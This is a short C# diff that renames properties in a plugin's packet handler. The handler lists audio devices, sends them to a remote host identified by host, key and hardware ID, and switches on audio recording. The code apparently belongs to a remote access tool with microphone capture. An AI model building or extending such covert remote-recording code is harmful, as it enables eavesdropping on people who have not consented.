@@ -19,12 +19,12 @@ namespace Plugin
         {
             audioCapture = false;
 
-            switch (loadingAPI.currentPacket.packetType) 
+            switch (loadingAPI.CurrentPacket.PacketType) 
             {
                 case PacketType.AUDIO_GET_DEVICES:
-                    ClientHandler clientHandlerGetAudioDevices = new ClientHandler(loadingAPI.host, loadingAPI.key, loadingAPI.baseIp, loadingAPI.HWID);
+                    ClientHandler clientHandlerGetAudioDevices = new ClientHandler(loadingAPI.Host, loadingAPI.Key, loadingAPI.BaseIp, loadingAPI.HWID);
                     clientHandlerGetAudioDevices.ConnectStart();
-                    RemoteAudioPacket remoteAudioPacket = new RemoteAudioPacket(GetDevices.GetAudioDevices(), loadingAPI.baseIp, loadingAPI.HWID);
+                    RemoteAudioPacket remoteAudioPacket = new RemoteAudioPacket(GetDevices.GetAudioDevices(), loadingAPI.BaseIp, loadingAPI.HWID);
                     while (!clientHandlerGetAudioDevices.Connected)
                         Thread.Sleep(125);
                     clientHandlerGetAudioDevices.SendPacket(remoteAudioPacket);
@@ -32,8 +32,8 @@ namespace Plugin
 
                 case PacketType.AUDIO_RECORD_ON:
                     audioCapture = true;
-                    remoteAudioCapturePacket = (RemoteAudioCapturePacket)loadingAPI.currentPacket;
-                    clientHandler = new ClientHandler(loadingAPI.host, loadingAPI.key, loadingAPI.baseIp, loadingAPI.HWID);
+                    remoteAudioCapturePacket = (RemoteAudioCapturePacket)loadingAPI.CurrentPacket;
+                    clientHandler = new ClientHandler(loadingAPI.Host, loadingAPI.Key, loadingAPI.BaseIp, loadingAPI.HWID);
                     clientHandler.ConnectStart();
                     break;
 
